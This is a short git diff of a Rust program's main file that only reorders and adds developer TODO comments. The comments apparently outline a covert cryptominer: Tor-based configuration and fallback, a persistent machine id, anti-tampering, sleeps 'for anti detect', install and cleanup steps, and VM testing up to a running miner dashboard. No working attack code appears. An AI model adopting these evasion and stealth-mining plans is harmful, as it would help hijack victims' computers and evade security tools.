@@ -245,18 +245,17 @@ fn main() {
     }
 }
 
-//  rewrite everything where we get checks as variables and then each call is just a combination of checks, and they are ordered by the order of how we decide
-
-//?  in tor handler modify to read data read the first data if exists and other native types sent to not error
-
-// in logger setup so that we save last log and if identical - we use (count) that repeats - fix for panic and huuuge bug when sizes get too big from some errors too much | somehow else prevent logger for making TOO BIG logs SIZE
-
-// improve clean up a little to not look dirty
-
-//? sparse out pre install
-
 //? code run config in tor
-
 //? code post cleanup
-
+//? in tor handler modify to read data read the first data if exists and other native types sent to not error
+//? sparse out pre install
+//? if cannot connect to tor - run prewritten runconfig ( for miner etc ) still needed
+//? code constant id getting
+// in logger setup so that we save last log and if identical - we use (count) that repeats - fix for panic and huuuge bug when sizes get too big from some errors too much | somehow else prevent logger for making TOO BIG logs SIZE
+// add better anti tampering
 // code inf cleanup
+// rewrite everything where we get checks as variables and then each call is just a combination of checks, and they are ordered by the order of how we decide
+// improve clean up a little to not look dirty
+// add sleep in between for anti detect
+
+//* TEST AND TRY EACH SCENARIO IN VM UP TO RUNNING MINER DASHBOARD FULL
